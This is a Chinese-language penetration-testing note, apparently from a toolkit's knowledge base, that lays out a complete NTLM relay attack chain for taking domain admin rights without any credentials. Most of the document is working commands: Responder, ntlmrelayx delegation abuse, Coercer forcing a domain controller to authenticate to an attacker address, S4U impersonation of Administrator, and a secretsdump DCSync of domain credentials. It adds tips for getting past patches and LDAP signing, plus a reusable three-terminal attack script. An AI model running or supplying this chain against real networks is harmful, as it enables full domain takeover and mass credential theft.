# [2026-04] NTLM Relay + Coercer → 域管权限（无需密码）

## 场景分类
渗透测试 / 内网 / AD 攻击

## 目标概述
在已获取内网接入点但无任何凭据的情况下，通过 NTLM Relay 攻击链获取域管权限。

## 完整执行链路

1. 内网接入后启动 Responder 监听（关闭 SMB/HTTP）
   ```bash
   # 编辑 /etc/responder/Responder.conf
   # SMB = Off, HTTP = Off
   responder -I eth0 -v
   ```

2. 启动 ntlmrelayx 中继到 LDAP（用于 AD CS 攻击）
   ```bash
   ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access
   ```

3. 使用 Coercer 强制 DC 向我们认证
   ```bash
   coercer coerce -u '' -p '' -d domain.local \
     -l attacker_ip -t dc01.domain.local --always-continue
   ```

4. DC 的机器账户 NTLM 认证被中继到 LDAP
5. ntlmrelayx 自动创建机器账户并配置约束委派
6. 使用 S4U2Self + S4U2Proxy 模拟域管
   ```bash
   getST.py -spn cifs/dc01.domain.local \
     -impersonate Administrator \
     domain.local/CREATED_MACHINE\$:'password' -dc-ip 10.0.0.1
   ```

7. 使用票据 DCSync
   ```bash
   export KRB5CCNAME=Administrator.ccache
   secretsdump.py -k -no-pass dc01.domain.local
   ```

## 踩坑记录

| 问题 | 原因 | 解决方案 | 耗时 |
|------|------|---------|------|
| Coercer 无法触发认证 | 目标 DC 已打补丁禁用 PetitPotam | 换用 PrinterBug（MS-RPRN） | 30min |
| ntlmrelayx 报 LDAP signing required | DC 启用了 LDAP 签名 | 改为中继到 LDAPS（636）或 HTTP AD CS | 20min |
| 创建的机器账户无法 S4U | 域策略限制机器账户创建数 | 用已有的低权限域用户账户替代 | 15min |

## 工具链发现
- Coercer 比手动调用 PetitPotam 更方便，自动尝试多种协议
- ntlmrelayx 的 `--delegate-access` 参数是关键，自动完成委派配置
- 如果 LDAP 签名启用，可以改为中继到 AD CS 的 HTTP 端点（ESC8）

## 关键代码/命令

```bash
# 完整攻击链一条龙（需要 3 个终端）
# 终端 1: Responder
responder -I eth0 -v

# 终端 2: ntlmrelayx
ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access --escalate-user attacker

# 终端 3: Coercer
coercer coerce -u '' -p '' -d domain.local -l attacker_ip -t dc01.domain.local
```

## 可复用的模式/脚本片段

```bash
# 快速检测 NTLM Relay 可行性
# 1. 检查 SMB 签名
crackmapexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt

# 2. 检查 LDAP 签名
crackmapexec ldap dc01.domain.local -u '' -p '' -M ldap-checker

# 3. 检查可触发的协议
coercer scan -u user -p pass -d domain.local -t dc01.domain.local
```

## 对本包的改进建议
- Coercer 和 Responder 已在路由和 bootstrap 中 ✓
- ntlmrelayx 属于 impacket 套件，Kali 预装 ✓

## 进化动作
- [x] 无需更新（已覆盖）

## 环境信息
- Kali 2026.1, impacket 0.12.0, coercer 2.4.3
- 目标: Windows Server 2022 DC, 域功能级别 2016
- 前提: 已有内网接入点（通过 VPN 漏洞获取）
